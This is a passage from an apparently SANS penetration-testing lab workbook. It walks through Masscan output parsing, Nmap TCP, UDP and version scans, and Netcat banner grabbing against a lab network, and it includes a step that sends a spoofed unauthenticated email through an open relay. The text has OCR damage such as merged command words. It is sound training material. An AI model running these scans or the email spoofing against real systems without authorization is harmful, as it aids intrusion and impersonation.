Service ready at Tue, 24 Sep 2024 04:21:14 +0000\x0a250-mail01.hiboxy.com Hello

[10.254.252.3]\x0a250-SIZE 37748736\x0a250-PIPELINING\x0a250-DSN\x0a250-

ENHANCEDSTATUSCODES\x0a250-STARTTLS\x0a250-X-ANONYMOUSTLS\x0a250-AUTH NTLM\x0a250-X-EXPS

GSSAPI NTLM\x0a250-8BITMIME\x0a250-BINARYMIME\x0a250-CHUNKING\x0a250-SMTPUTF8\x0a250

XRDST\x0a220 2.0.0 SMTP server ready

The SMTP banner on 10.130.10.25 system also tells the name of the host is mail01.hiboxy.com.

Let's take a look at a portion of the Greppable ( .gnmap) output.

#### Expected Results

Timestamp: 1727151519 Host: 10.130.10.11 () Ports: 80/open/tcp//http//

Timestamp: 1727151523 Host: 10.130.10.6 () Ports: 80/open/tcp//http//

Host: 10.130.10.11 () Port: 80 Service: http.server Banner: nginx/1.24.0 (Ubuntu)

Note that each port status gets one line in the output, and the banner information is on a separate line.

Let's use grep to find all the lines that contain /open/tcp/ . To do this, we can use the grep command:

#### Command

grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap

#### Expected Results

sec560@560vm:~\$ grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap Timestamp: 1727151519 Host: 10.130.10.11 () Ports: 80/open/tcp//http// Timestamp: 1727151523 Host: 10.130.10.6 () Ports: 80/open/tcp//http// Timestamp: 1727151524 Host: 10.130.10.21 () Ports: 3389/open/tcp//ms-wbt-server// Timestamp: 1727151531 Host: 10.130.10.5 () Ports: 3389/open/tcp//ms-wbt-server// ...output truncated for brevity...

If we want the port, we can use the awk command, which has an advantage over cut in that it can handle multiple consecutive delimiters (since masscan adds spaces as necessary to align columns). We can use awk to print the fourth field, which is the port number.

### sort options: u : Return unique values only V: Natural sort of version numbers (works well on IP addresses too!) Command grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap | awk'{print \$4}' | sort -uV Expected Results sec560@560vm:~\$ grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap | awk'{print \$4}' | sort -uV 10.130.10.4 10.130.10.5 10.130.10.6 10.130.10.7 10.130.10.10 10.130.10.11 10.130.10.21 10.130.10.22 10.130.10.23 10.130.10.25 10.130.10.33 10.130.10.44 10.130.10.45 • •

file named something like in a format other tools like

nmap can use. We'll leave that to you as an exercise.

Next, get a list of all the listening ports in the organization. The port is contained within the seventh field, so let's start with that:

# Command grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap | awk'{print \$7}' | sort -uV | head Expected Results sec560@560vm:~\$ grep '/open/tcp' /tmp/masscan\_10.130.10.0\_24\_full.gnmap | awk'{print \$7}' | sort -uV | head 22/open/tcp//ssh// 23/open/tcp//telnet// 25/open/tcp//smtp// 53/open/tcp//domain// 80/open/tcp//http// 135/open/tcp//epmap// 139/open/tcp//netbios-ssn// 389/open/tcp//ldap// 443/open/tcp//https// 444/open/tcp//snpp//

Next, let's use cut to retrieve just those unique port numbers:

```
Command
 grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk'{print $7}' | cut -d '/' -f 1 | sort -
 un
 Expected Results
   sec560@560vm:~$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk'{print $7}' | cut
   -d '/' -f 1 | sort -un
   22
   23
   25
   53
   80
   135
   139
   389
   443
   444
   445
   464
   465
   475
   476
   477
   587
   [...truncated for brevity...]
```

Next, let's save the open ports to a file named open\_ports.txt in a format other tools like nmap can use.

```
There is no output from this command.
Command
 grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk'{print $7}' | cut -d '/' -f 1 | sort -
 un | tr '\n' ',' | sed 's/,$//' > /tmp/10.130.10.0_24_openports.txt
```

scans.

#### Conclusion

In this lab, we've seen Masscan is a fast way to perform port scanning. We do have to be careful that we don't scan too fast and take down any target infrastructure. Masscan is good at one thing, port scanning.

In later labs, we'll take a look at some of the more advanced features of Nmap and how Nmap OS fingerprinting and version scanning can gather information about operating system types and the versions of software running on target machines. This information is tremendously useful to a penetration tester in focusing an attack and using specific tools and exploits to gain access to a target environment.

In addition, we will use GoWitness to get a quick look at the websites available in the organization. This helps the penetration tester quickly identify interesting websites.

## *Lab 1.4: Nmap*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Background

Masscan gave you the broad strokes, but now you need detailed intelligence about specific systems. Using Nmap, you'll perform targeted scans to identify exact service versions, operating systems, and potential vulnerabilities.

Your reconnaissance will reveal Windows domain controllers, Linux servers, and various services that could serve as pivot points once initial access is achieved. The detailed service enumeration will guide your exploitation strategy in the coming attacks.

→

#### Lab Setup

VM used:

Linux •

You should be able to ping 10.130.10.10 from the SEC560 Linux VM:

#### Command

ping -c 4 10 .130.10.10

#### Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.10 PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data. 64 bytes from 10.130.10.10: icmp\_seq=1 ttl=63 time=77.3 ms 64 bytes from 10.130.10.10: icmp\_seq=2 ttl=63 time=77.1 ms 64 bytes from 10.130.10.10: icmp\_seq=3 ttl=63 time=79.7 ms 64 bytes from 10.130.10.10: icmp\_seq=4 ttl=63 time=81.3 ms

--- 10.130.10.10 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 2997ms rtt min/avg/max/mdev = 77.051/78.840/81.315/1.757 ms

#### Lab – Step-by-Step Instructions

#### *1: Initial Scan*

Let's run a scan of the target subnet.

#### Command

nmap -n 10.130.10.1-10

#### Expected Results

sec560@560vm:~\$ nmap -n 10.130.10.1-10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:08 UTC Nmap scan report for 10.130.10.5 Host is up (0.083s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Nmap scan report for 10.130.10.6

Host is up (0.082s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3389/tcp open ms-wbt-server

Nmap scan report for 10.130.10.10 Host is up (0.086s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 23/tcp open telnet 80/tcp open http 9100/tcp open jetdirect

Nmap done: 10 IP addresses (3 hosts up) scanned in 11.85 seconds

The -n means that Nmap should not resolve domain names. While the Nmap scan runs, pressing the p key turns on per-packet logging, and Shift-p turns this off.

Recall from our lecture that Nmap cannot send ICMP packets unless it is running as root . If we were to run the previous command with sudo or as the root user, we would see ICMP packets as well.

Also, try hitting the v and d keys multiple times each for verbosity and debug information, respectively. If you can't type that fast enough, try relaunching the scan and then pressing them.

#### *2: Scanning 10.130.10.33*

Next, let's conduct a TCP port scan of target machine 10.130.10.33.

![](SEC560_WorkBook1_page_52_Figure_3.jpeg)

Next, back in your original Nmap terminal window, invoke Nmap to scan the 10.130.10.33 host, doing a TCP connect scan (full three-way handshake):

sudo nmap-n -sT 10.130.10.33 -F

#### Expected results

sec560@560vm:~\$ sudo nmap-n -sT 10.130.10.33 -F Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:11 UTC Nmap scan report for 10.130.10.33 Host is up (0.075s latency). Not shown: 98 filtered tcp ports (no-response) PORT STATE SERVICE 1433/tcp open ms-sql-s 3389/tcp open ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds

Nmap displays the total time it takes to complete the scan, as shown above.

Also, look at the output of your sniffer. You should see a lot of SYN packets ( S ) going from your machine to the target. There will be a relatively smaller number of SYN-ACKs coming back, as well as ACKs going from your machine, to complete the three-way handshake.

Nmap did not scan all TCP ports with that invocation, however. It scanned the top 100 most frequently used ports (due to -F , otherwise it'd be the top 1,000), as indicated in the /usr/share/nmap/nmap-services file. If we were to scan all ports using -p 0- , this command will likely take 5 minutes or more. If you'd like to scan all the ports, please do so after you have completed the lab the first time. Let's see what the results look like if we scan more ports using --top-ports 3000 .

sudo nmap-n -sT 10.130.10.33 --top-ports 3000

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -sT 10.130.10.33 --top-ports 3000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:12 UTC Nmap scan report for 10.130.10.33 Host is up (0.078s latency). Not shown: 2997 filtered tcp ports (no-response) PORT STATE SERVICE 1433/tcp open ms-sql-s 3389/tcp open ms-wbt-server 5985/tcp open wsman

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

This scan took longer, but notice Nmap discovered more open ports. Of course, the more ports you scan the longer it will take. This is the time versus accuracy trade off. We can check all 65,536 ports, but that is going to take a long time (approximately 65 times longer than 1,000 ports). This may not be a problem on a small number of hosts, but the scan may be prohibitively slow an a larger network or target range.

#### *3: Output Formats*

Next, look at the output format files that Nmap can create via the -oA option. Rerun your -sT scan with the default ports, storing your results in all the major format styles ( -oA to indicate Normal, Greppable, and XML output). Store your results in files in the / tmp directory with a base name of scan, which indicates the scan type and the IP address of the target. We'll also speed up the scan with -F (scan only the top 100 ports) and -T4 (decrease timeouts and scan in parallel).

```
sudo nmap-n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4
```

#### Expected Results

```
sec560@560vm:~$ sudo nmap-n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:13 UTC
Nmap scan report for 10.130.10.4
Host is up (0.081s latency).
Not shown: 93 filtered tcp ports (no-response)
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
3389/tcp open ms-wbt-server
[...trimmed for brevity...]
Nmap scan report for 10.130.10.45
Host is up (0.079s latency).
Not shown: 99 filtered tcp ports (no-response)
PORT STATE SERVICE
3389/tcp open ms-wbt-server
```

Nmap done: 256 IP addresses (13 hosts up) scanned in 10.07 seconds

Then get a list of the files associated with the scan inside of /tmp .

#### Command

ls -l /tmp/scan\*

#### Expected Results

```
sec560@560vm:~$ ls -l /tmp/scan*
-rw-r--r-- 1 root root 2627 Aug 14 18:13 /tmp/scan.gnmap
-rw-r--r-- 1 root root 3065 Aug 14 18:13 /tmp/scan.nmap
-rw-r--r-- 1 root root 19786 Aug 14 18:13 /tmp/scan.xml
```

You should see three files with the same base name but with a different extension:

- Greppable form with a .gnmap suffix •
- Normal form with a .nmap suffix •
- XML form with a .xml suffix •

Use the less to review the .nmap file (press q to quit):

#### Command

less /tmp/scan.nmap

You'll see that the file contains the same information displayed on the screen during a scan.

Next, let's take a look at the .xml output file (press q to quit):

#### Command

less /tmp/scan.xml

This file is XML, and much less readable by humans. However, this format can be read by other tools including GoWitness (which is covered later in this course).

Finally, let's view the contents of the .gnmap using cat .

cat /tmp/scan.gnmap

#### Expected Results

```
sec560@560vm:~$ cat /tmp/scan.gnmap
# Nmap 7 .94SVN scan initiated Wed Aug 14 18:13:03 2024 as: nmap -n -sT -oA /tmp/scan -F -T4 10.
130.10.0/24
Host: 10.130.10.4 () Status: Up
Host: 10.130.10.4 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/
open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//
microsoft-ds///, 3389/open/tcp//ms-wbt-server/// Ignored State: filtered (93)
Host: 10.130.10.5 () Status: Up
Host: 10.130.10.5 () Ports: 80/open/tcp//http///, 445/open/tcp//microsoft-ds///, 3389/
open/tcp//ms-wbt-server/// Ignored State: filtered (97)
Host: 10.130.10.6 () Status: Up
Host: 10.130.10.6 () Ports: 80/open/tcp//http///, 3389/open/tcp//ms-wbt-server/// 
Ignored State: filtered (98)
...trimmed for brevity...
```

Note that all the results for a given host are stored on one line with each open port and associated service identified. This format is easy to search using grep . In fact, let's do that now!

#### *4: Finding Hosts by Open Port*

Let's find all the systems listening on port 389, the port used by LDAP.

grep 389/open /tmp/scan.gnmap

#### Expected Results

sec560@560vm:~\$ grep 389/open /tmp/scan.gnmap Host: 10.130.10.4 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/ open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//

microsoft-ds///, 3389/open/tcp//ms-wbt-server/// Ignored State: filtered (93)

Host: 10.130.10.5 () Ports: 80/open/tcp//http///, 445/open/tcp//microsoft-ds///, 3389/ open/tcp//ms-wbt-server/// Ignored State: filtered (97)

Host: 10.130.10.6 () Ports: 80/open/tcp//http///, 3389/open/tcp//ms-wbt-server/// Ignored State: filtered (98)

Host: 10.130.10.7 () Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///,

3389/open/tcp//ms-wbt-server/// Ignored State: filtered (97)

Host: 10.130.10.21 () Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/ open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server/// Ignored State: filtered (96)

Host: 10.130.10.23 () Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///,

3389/open/tcp//ms-wbt-server/// Ignored State: filtered (97)

...truncated for brevity...

If you look closely, you'll see that the only .4 system is listening on port 389, but other hosts show up in this list. This is because 389 is part of 3389. If we want to look for exactly 389, we'll have to use a different command. Notice that before the port number there is a space. We can use grep's -w option to "Select only those lines containing matches that form whole words" (as described in the output of man grep).

#### Command

grep -w 389/open /tmp/scan.gnmap

#### Expected Results

sec560@560vm:~\$ grep -w 389/open /tmp/scan.gnmap

Host: 10.130.10.4 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/ open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp// microsoft-ds///, 3389/open/tcp//ms-wbt-server/// Ignored State: filtered (93)

Let's now look for the number of hosts listening on port 445 using wc -l (lowercase L).

We can use the wc -l command to get the number of hosts with port 445 open.

grep -w 445/open /tmp/scan.gnmap| wc -l

#### Expected Results

```
sec560@560vm:~$ grep -w 445/open /tmp/scan.gnmap| wc -l
7
```

The wc command is used to get a "word count" and the -l (lowercase L) option tells the command to return the number of lines. Notice that there are 7 systems listening on port 445.

If we want a list of systems listening on port 445, we can extract the IP address using cut . We'll specify the delimiter with -d , using the space ' ' as the delimiter. The IP address is the second field, which we can select with -f 2 .

#### Command

grep -w 445/open /tmp/scan.gnmap| cut -d ' ' -f 2

#### Expected Results

```
sec560@560vm:~$ grep -w 445/open /tmp/scan.gnmap| cut -d ' ' -f 2
10.130.10.4
10.130.10.5
10.130.10.7
10.130.10.21
10.130.10.23
10.130.10.25
10.130.10.44
```

#### *5: The nmap-services File*

Next, review the ports in the nmap-services file (the file from which Nmap gets its list of most frequent ports to scan) by running:

#### Command

less /usr/share/nmap/nmap-services

The format of this file includes the service name (for example, ftp), the associated port and protocol (for example, 21/tcp ), the relative frequency with which the given port was discovered during Fyodor's widespread internet scanning research, and an optional comment. Note that the ports themselves are typically TCP or UDP; however, some are associated with the Stream Control Transmission Protocol (SCTP), an alternative Layer 4 protocol defined by RFC 4960.

#### *6: UDP Scanning*

Now that you've looked at TCP port scanning with Nmap, try UDP port scanning. We discussed earlier that Linux kernels throttle ICMP port unreachable responses so that they send only one every second. You'll see that one-message-per-second behavior now because 10.130.10.10 is a Linux machine. Keep your tcpdump sniffer running, showing packets going to and from host 10.130.10.10.

Now invoke Nmap to perform a UDP port scan of 10.130.10.10 using -sU

#### Command

sudo nmap-n -sU 10.130.10.10

In your sniffer output, you will likely see several UDP packets and some ICMP port unreachables sent periodically.

In your Nmap window, press the spacebar to get a status report. You will likely see that the scan is only a small percentage done, depending on your system speed and the network speed.

Your output will be similar to what is shown below:

#### Expected Results

Press the spacebar to see the status.

sec560@560vm:~\$ sudo nmap-n -sU 10.130.10.10

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:18 UTC

Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan

UDP Scan Timing: About 2.57% done; ETC: 18:27 (0:08:13 remaining)

#### Slow!

This scan is very slow. Press CTRL-C to stop Nmap before the scan completes.

#### *7: Targeted UDP Scan*

Now rerun an Nmap UDP scan of the target, this time focusing on a narrower list of ports: 53,111,414,500-501. Target the .4 and . 10 hosts.

sudo nmap-n -sU 10.130.10.4,10 -p 53,111,414,500-501

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -sU 10.130.10.4,10 -p 53,111,414,500-501 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:19 UTC Nmap scan report for 10.130.10.4 Host is up (0.085s latency).

PORT STATE SERVICE 53/udp open domain 111/udp open|filtered rpcbind 414/udp open|filtered infoseek 500/udp open|filtered isakmp 501/udp open|filtered stmf

Nmap scan report for 10.130.10.10 Host is up (0.077s latency).

PORT STATE SERVICE 53/udp closed domain 111/udp closed rpcbind 414/udp closed infoseek 500/udp closed isakmp 501/udp closed stmf

Nmap done: 2 IP addresses (2 hosts up) scanned in 3.94 seconds

Notice that the ports show up as open|filtered on the .4 (Windows Domain Controller) host.

On the .10 (Linux) host, all the ports are closed . At first glance, this can be confusing. This is why we often want to use the - open option to only show open ports.

If we run the command again using --open it is much more obvious that Nmap did not find any listening UDP ports on 10.130.10.10:

sudo nmap-n -sU 10.130.10.4,10 -p 53,111,414,500-501 --open

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -sU 10.130.10.4,10 -p 53,111,414,500-501 --open Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 18:19 UTC Nmap scan report for 10.130.10.4 Host is up (0.078s latency).

PORT STATE SERVICE 53/udp open|filtered domain 111/udp open|filtered rpcbind 414/udp open|filtered infoseek 500/udp open|filtered isakmp 501/udp open|filtered stmf

Nmap done: 2 IP addresses (2 hosts up) scanned in 1.98 seconds

#### Conclusion

In this lab, we have seen how Nmap scans sweep through a target environment to identify potential target systems. We also explored various options for TCP and UDP scanning, along with the really useful --open Nmap command line option.

# *Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Objectives

- To analyze the nmap-service-probes file •
- To use Nmap's version scanning feature to determine the speci fic software versions and protocol versions targets are using •
- To analyze the categories of Nmap Scripting Engine (NSE) scripts •
- To run some of the most useful NSE scripts •
- To compare how Nmap behaves when NSE scripts are run with and without version scanning •
- To gather SMB information from a target Windows machine •
- To use Nmap to perform operating system fingerprinting of target machines •
- To use NSE scripts and NetExec to aid in identifying target operating systems •
- To use GoWitness to visually inspect scan results •

#### Lab Setup

VM used:

Linux •

You should be able to ping 10.130.10.10 from the Linux VM:

#### Command

ping -c 4 10 .130.10.10

#### Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.10
PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data.
64 bytes from 10.130.10.10: icmp_seq=1 ttl=63 time=79.4 ms
64 bytes from 10.130.10.10: icmp_seq=2 ttl=63 time=77.1 ms
64 bytes from 10.130.10.10: icmp_seq=3 ttl=63 time=78.4 ms
64 bytes from 10.130.10.10: icmp_seq=4 ttl=63 time=81.7 ms
--- 10.130.10.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 77.100/79.161/81.744/1.693 ms
```

#### Lab – Step-by-Step Instructions

#### *1: The nmap-service-probes File*

We'll start this lab by performing version scanning of the lab environment; however, before we do that, it's important to understand how Nmap's version scanning features works.

For version scanning, Nmap uses a file called nmap-service-probes, located in the /usr/share/nmap directory. In that file, lines that start with "Probe" indicate the messages to send to target services, and lines that start with "match" are signatures used to identify services based on the responses to probes.

Open the file to look at its probe and match lines:

#### Command

less /usr/share/nmap/nmap-service-probes

Scroll through the file and look at the match patterns, and other keywords such as Excludes and ports . When you are finished, press q to exist less

The various keywords in the service probes file are always at the beginning of the line. If you were to use wc -l , you'd see there are over 16,000 lines, but how many of those lines are "probes", and how many are "matches"? Let's find out. We'll ignore lines beginning with # since those are comments, and then get a count of unique keywords that start each line.

```
Command
 grep -v ^# /usr/share/nmap/nmap-service-probes | cut -d ' ' -f1 | sort | uniq -c
 Expected Results
  sec560@560vm:~$ grep -v ^# /usr/share/nmap/nmap-service-probes | cut -d ' ' -f1 | sort | uniq -c
   2011 
   1 Exclude
   11 fallback
   11723 match
   180 ports
   184 Probe
   183 rarity
   194 softmatch
   27 sslports
   1 tcpwrappedms
   6 totalwaitms
```

Wow! There are only 184 unique probes that can identify over 11,723 different services! Later, you can learn more about the different keywords here.

Now, let's use grep to look at the first Apache match:

![](SEC560_WorkBook1_page_65_Figure_4.jpeg)

Notice the string Apache mod\_ftpd and other information that Nmap uses to identify this particular service.

#### *2: Version scan of .25*

Let's run a basic Nmap scan, focusing on port 25 on 10.130.10.25.

#### Command

sudo nmap-n -p 25 10.130.10.25

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -p 25 10.130.10.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-11 03:13 UTC Nmap scan report for 10.130.10.25 Host is up (0.027s latency).

PORT STATE SERVICE

25/tcp open smtp

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds

Run the same command again, but this time use -sV .

#### Command

sudo nmap-n -p 25 10.130.10.25 -sV

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -p 25 10.130.10.25 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-11 03:14 UTC Nmap scan report for 10.130.10.25 Host is up (0.029s latency).

#### PORT STATE SERVICE VERSION

25/tcp open smtp Microsoft Exchange smtpd

Service Info: Host: mail01.hiboxy.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/ submit/ .

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

Compare the output of the two commands.

Notice the difference in the detection for this specific port. Without the -sV option, Nmap uses the name in the nmap-services file. With the -sV , Nmap will probe the service and determine the service information (when possible). It also correctly guesses the OS and extracts the hostname ( mail01.hiboxy.com).

#### *3: Examining a Service with Netcat*

We saw that the version scanning extracted the hostname. How did it do that? To see what happened, let's examine the system with Netcat. We'll use nc to connect to the host on port 25.

The command looks like this: nc -nv 10.130.10.25 25 . The options are

- n : Do not resolve names •
- v : Be verbose (show when the connection happens) •
- 10.130.10.25 : The target host •
- 25: The target port •

#### Command

nc -nv 10.130.10.25 25

#### Expected Results

sec560@560vm:~\$ nc -nv 10.130.10.25 25 (UNKNOWN) [10.130.10.25] 25 (smtp) open 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Thu, 11 Sep 2025 03:16:38 +0000

Notice the response from the server. This is what is known as a banner, or information sent from the server immediately upon connecting. The string Microsoft ESMTP MAIL Service identifies it as a Microsoft Exchange server. To the left of that is the hostname mail01.hiboxy.com.

Press CTRL+C to terminate the connection.

If we look back at the nmap-service-probes file for Microsoft ESMTP MAIL Service ready we'll see the match rule applied by Nmap.

grep 'Microsoft ESMTP MAIL Service ready' /usr/share/nmap/nmap-service-probes

#### Expected Results

sec560@560vm:~\$ grep 'Microsoft ESMTP MAIL Service ready' /usr/share/nmap/nmap-service-probes match smtp m|^220 ([-\w\_.]+) Microsoft ESMTP MAIL Service ready at| p/Microsoft Exchange smtpd/ o/Windows/ h/\$1/ cpe:/a:microsoft:exchange\_server/ cpe:/o:microsoft:windows/a

In the match, the regular expression [-\w\_.]+ is used to extract the hostname. At the end of the line, cpe:/o:microsoft:windows/a is used to identify the host as a Windows system.

We can also use Netcat to interact with the mail system. If we run it with -C , Netcat will send CRLF as the line ending, which will allow us to interact with SMTP. Let's connect to the mail server again and see if we can send an email!

nc -nvC 10.130.10.25 25

#### Expected Results

sec560@560vm:~\$ nc -nvC 10.130.10.25 25 (UNKNOWN) [10.130.10.25] 25 (smtp) open 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Thu, 11 Sep 2025 03:30:31 +00

Now, type ehlo and press Enter . EHLO tells the server we want to use Extended SMTP (ESMTP) features, so the server then lists the features it supports.

#### Expected Results

ehlo

250-mail01.hiboxy.com Hello [10.254.252.4]

250-SIZE 37748736

250-PIPELINING

250-DSN

250-ENHANCEDSTATUSCODES

250-STARTTLS

250-X-ANONYMOUSTLS

250-AUTH NTLM

250-X-EXPS GSSAPI NTLM

250-8BITMIME

250-BINARYMIME

250-CHUNKING

250-SMTPUTF8

250 XRDST

Next, we'll send the envelope portions of the email. Copy and paste the following into your console:

mail from:<pentest@hiboxy.com> rcpt to:<bgreen@hiboxy.com>

data

Subject: Test Email

I used Netcat to send an unauthenticated email!

Sincerely,

Your Friendly Neighborhood Pen Tester

.

If you were to enter it one line at a time, your output would look like the following. If you paste all the lines at once, the lines of output will be out of order; however, it will still work.

#### Expected Results

mail from:<pentest@hiboxy.com> 250 2.1.0 Sender OK rcpt to:<bgreen@hiboxy.com> 250 2.1.5 Recipient OK data 354 Start mail input; end with <CRLF>.<CRLF> Subject: Test Email

I used Netcat to send an unauthenticated email!

Sincerely,

Your Friendly Neighborhood Pen Tester

250 2.6.0 <a9cb7cca-1c27-47f6-9c01-7e7aeb47568d@mail01.hiboxy.com> [InternalId=317827579905, Hostname=mail01.hiboxy.com] 1559 bytes in 14.755, 0.103 KB/sec

#### Note

.

If you don't see the line starting with 250 2.6.0 and ending with , press Enter one more time to send the email.

If you pasted all the lines at once, the lines of output will be in a different order.

Either type quit and pres Enter or press ctrl + c to terminate the connection.

Congratulations! You just spoofed an email! Other things you could test with an open SMTP rely like this:

#### *4: Version Scan of .10*

Not only does version scanning help us determine the version of software running on a remote system, it also identi fies services running on nonstandard ports. For instance, run a basic scan with no name resolution against 10.130.10.10.

sudo nmap-n -F 10.130.10.10

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -F 10.130.10.10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-07 21:30 UTC Nmap scan report for 10.130.10.10 Host is up (0.040s latency).

Not shown: 96 closed tcp ports (reset) PORT STATE SERVICE

22/tcp open ssh 23/tcp open telnet 80/tcp open http 9100/tcp open jetdirect

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds

Nmap identifies the services names based on the port number. Remember that after SYN, SYN-ACK, ACK, that Nmap will tear down the connection. It will not process other data from the system. Notice that the system seems to be running both ssh and telnet.

Let's now do an Nmap version scan of these two hosts with -sV .

```
sudo nmap-n -sT -F --open 10.130.10.10 -sV
```

#### Expected Results

sec560@560vm:~\$ sudo nmap-n -F 10.130.10.10 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-07 21:31 UTC Nmap scan report for 10.130.10.10 Host is up (0.040s latency). Not shown: 96 closed tcp ports (reset) PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0) 23/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)

80/tcp open http nginx 1.24.0 (Ubuntu)

9100/tcp open jetdirect?

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/ submit/ .

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds

Compare your results to those discovered when you performed the scan without the version scan. Notice that we get more detail on the target services. We can also see that it's running Ubuntu Linux; however, we don't know which release. You can reference the package repositories to see which release run nginx 1.24.0 and OpenSSH 9.6p1, or you can use this handy reference. Notice OpenSSH is more precise, since nginx has the same version across multiple releases. While it isn't perfect, this is often more helpful than Nmap's OS Detection feature, which we'll see later.

| Ubuntu Version       | OpenSSH | Apache | nginx  |  |
|----------------------|---------|--------|--------|--|
| 14.04 - trusty [LTS] | 6.6p1   | 2.4.7  | 1.4.6  |  |
| 14.10 - utopic       | 6.6p1   | 2.4.10 | 1.6.2  |  |
| 15.04 - vivid        | 6-7p1   | 2.4.12 | 1.6.2  |  |
|                      |         |        |        |  |
|                      |         |        |        |  |
| 23.04 - junar        | 9.0p1   | 2.4.54 | 1.24.0 |  |
| 23.10 - mantic       | 9.3p1   | 2.4.57 | 1.24.0 |  |
| 24.04 - noble [LTS]  | 9.6p1   | 2.4.58 | 1.24.0 |  |
| 24.10 - oracular     | 9.7p1   | 2.4.62 | 1.26.0 |  |
| 25.04 - plucky       | 9.9p1   | 2.4.63 | 1.26.3 |  |

#### *5: The script.db File*

We will now look at the functionality of the Nmap Scripting Engine. Start by opening up the file that contains the inventory of all the scripts that have been defined for NSE. Let's take a look at the first 10 lines of the file using head.

head /usr/share/nmap/scripts/script.db

#### Expected Results

```
sec560@560vm:~$ head /usr/share/nmap/scripts/script.db
Entry { filename = "acarsd-info.nse", categories = { "discovery", "safe", } }
Entry { filename = "address-info.nse", categories = { "default", "safe", } }
Entry { filename = "afp-brute.nse", categories = { "brute", "intrusive", } }
Entry { filename = "afp-ls.nse", categories = { "discovery", "safe", } }
Entry { filename = "afp-path-vuln.nse", categories = { "exploit", "intrusive", "vuln", } }
Entry { filename = "afp-serverinfo.nse", categories = { "default", "discovery", 
"safe", } }
Entry { filename = "afp-showmount.nse", categories = { "discovery", "safe", } }
Entry { filename = "ajp-auth.nse", categories = { "auth", "default", "safe", } }
Entry { filename = "ajp-brute.nse", categories = { "brute", "intrusive", } }
Entry { filename = "ajp-headers.nse", categories = { "discovery", "safe", } }
```

This script.db file has a simple format, essentially mapping script categories, such as "safe", "intrusive", and "vulnerability", to the specific script files, which end in .nse. Note that some scripts are in multiple categories, such as dns-zone-transfer.nse, which is in the discovery and intrusive categories.

Let's count the number of scripts with wc -l .

